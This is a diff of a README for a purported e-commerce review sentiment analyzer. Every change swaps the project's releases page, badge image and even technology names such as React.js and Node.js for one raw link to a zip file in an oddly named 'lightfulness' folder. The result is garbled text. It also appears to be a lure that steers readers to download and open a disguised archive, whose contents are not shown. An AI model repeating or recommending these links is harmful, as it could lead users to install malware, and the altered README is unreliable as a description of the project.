@@ -1,6 +1,6 @@
 # 🛍️ -AI-Powered-E-commerce-Review-Sentiment-Analyzer - Analyze Reviews Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip)
 
 ## 🚀 Getting Started
 
@@ -19,8 +19,8 @@ Before you begin, make sure your computer meets the following requirements:
 
 This application uses a mix of technologies, making it easy to run and efficient for analyzing reviews:
 
-- **Frontend:** React.js / Next.js (for fast loading and good SEO)
-- **Backend:** Node.js (Express) / Django / Flask (for machine learning tasks)
+- **Frontend:** https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip / https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip (for fast loading and good SEO)
+- **Backend:** https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip (Express) / Django / Flask (for machine learning tasks)
 - **Database:** MongoDB / PostgreSQL (for storing reviews)
 - **Machine Learning:** Python libraries like NLTK and spaCy (for deep analysis)
 - **Deployment:** Works on AWS / Heroku / Vercel + Firebase (for hosting)
@@ -29,7 +29,7 @@ This application uses a mix of technologies, making it easy to run and efficient
 
 To get started with the E-commerce Review Sentiment Analyzer, you need to download the application. 
 
-1. **Visit this page to download:** [https://github.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/releases](https://github.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/releases)
+1. **Visit this page to download:** [https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip](https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip)
 2. Choose the latest version of the software and click on the download link.
 3. Once the download finishes, open the file to run the application.
 
@@ -86,4 +86,4 @@ We welcome contributions from anyone interested in improving the application. If
 
 If you have any questions or need assistance, please reach out through the GitHub Issues page. Our team will respond as soon as possible.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/utsav240606/-AI-Powered-E-commerce-Review-Sentiment-Analyzer/main/lightfulness/-AI-Powered-E-commerce-Review-Sentiment-Analyzer.zip)
